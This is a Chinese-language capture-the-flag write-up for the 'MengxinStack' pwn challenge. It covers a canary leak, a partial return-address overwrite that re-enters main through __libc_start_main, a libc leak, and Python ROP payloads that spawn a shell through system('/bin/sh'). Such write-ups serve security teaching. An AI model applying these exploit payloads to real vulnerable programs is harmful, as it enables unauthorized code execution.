## PWN_MengxinStack (526pt)

- 题目描述：
    
    > none
    
- 题目附件：[mengxin](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/CTFShow-36D/pwn/mengxin/mengxin)

- 考察点：ret2libc_start_main

- 难度：中等

### 程序分析

#### 保护机制

```c
[*] '/home/taqini/Downloads/36D/mengxin/mengxin'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

>  `Partial RELRO`  可以修改GOT表，不过这题好像用不上

#### 栈溢出

```c
int __cdecl main(int argc, const char **argv, const char **envp){
  int v3; // ST0C_4
  char buf; // [rsp+10h] [rbp-40h]
  unsigned __int64 v6; // [rsp+38h] [rbp-18h]

  v6 = __readfsqword(0x28u);
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 2, 0LL);
  puts("She said: hello?");
  v3 = read(0, &buf, 0x100uLL) - 1;
  printf("%s", &buf);
  read(0, &buf, 0x100uLL);
  puts("You had me at hello.");
  return 0;
}
```

有两个`read(0, &buf, 0x100uLL)`，第一个读完了打印`buf`，可以用来泄漏`canary`，第二个用来覆盖返回地址。

### 解题思路

#### 泄漏canary

要想覆盖返回地址，就需要先泄漏canary，这个可以用第一次read实现。

```c
  char buf; // [rsp+10h] [rbp-40h]
  unsigned __int64 v6; // [rsp+38h] [rbp-18h]
  v6 = __readfsqword(0x28u);
```

从这里可以看出，`v6`是`canary`，位于`buf`后方，offset=0x38-0x10=`40`，但是canary的最后一个字节是`\x00`，因此可以向`buf`中写`41`个字节，打印的时候带出`cancay`，然后还原末尾的`\x00`就是canary的实际值。

#### 泄漏libc

得到`canary`之后，要想完成攻击，还需要泄漏libc，这个可以用同样的方法，泄漏栈中的返回地址，即`__libc_start_main+243`

但是泄漏完canary后，程序中已经没有可以用来输出的函数了，因此要想办法重复利用`printf`来泄漏libc

####  ret2libc_start_main

这个可以通过第二个read，覆盖返回地址`__libc_start_main+243`的最后一个字节，ret2csu，重新调用main函数。

```nasm
.text:0000000000020803    mov     [rsp+0B8h+var_48], rax
.text:0000000000020808    lea     rax, [rsp+0B8h+var_98]
.text:000000000002080D    mov     fs:300h, rax
.text:0000000000020816    mov     rax, cs:environ_ptr_0
.text:000000000002081D    mov     rsi, [rsp+0B8h+var_B0]
.text:0000000000020822    mov     edi, [rsp+0B8h+var_A4]
.text:0000000000020826    mov     rdx, [rax]
.text:0000000000020829    mov     rax, [rsp+0B8h+var_A0]
.text:000000000002082E    call    rax
.text:0000000000020830
.text:0000000000020830 loc_20830:  ; CODE XREF: __libc_start_main+134↓j
.text:0000000000020830    mov     edi, eax
.text:0000000000020832    call    exit
```

`0x20830`这个是返回地址，他上面那条`call rax`就是去调用`main`，所以把返回地址稍微往上改一点，改成`0x020816`，就可以再次调用`main`

#### getshell

第二次泄漏完libc就可以常规的覆盖返回地址为`system("/bin/sh")`了

总体流程如下：

```python
# round1
sea('She said: hello?\n',cyclic(41))
ru(cyclic(41))
canary = uu64('\0'+rc(7))
info_addr('canary',canary)

payload = cyclic(40)+p64(canary)
payload+= cyclic(24)+'\x16' # ret2libc_start_main
se(payload)
```

> 泄漏canary、 ret2libc_start_main

```python
# round2
sea('She said: hello?\n',cyclic(72))
ru(cyclic(72))
libc_start_main_ret = uu64(rc(6))
libcbase = libc_start_main_ret - 0x20830

prdi = 0x0000000000021102 + libcbase # pop rdi ; ret
system = libc.sym['system'] + libcbase
binsh = libc.search('/bin/sh').next() + libcbase

pl2 = cyclic(40)+p64(canary)
pl2+= cyclic(24)
pl2+= p64(prdi) + p64(binsh) + p64(system)
sl(pl2)
```

> 泄漏libc，rop执行`system("/bin/sh")`

### More

you can download full exp from my [github](https://github.com/TaQini/ctf/tree/master/CTFShow-36D/pwn/mengxin) 

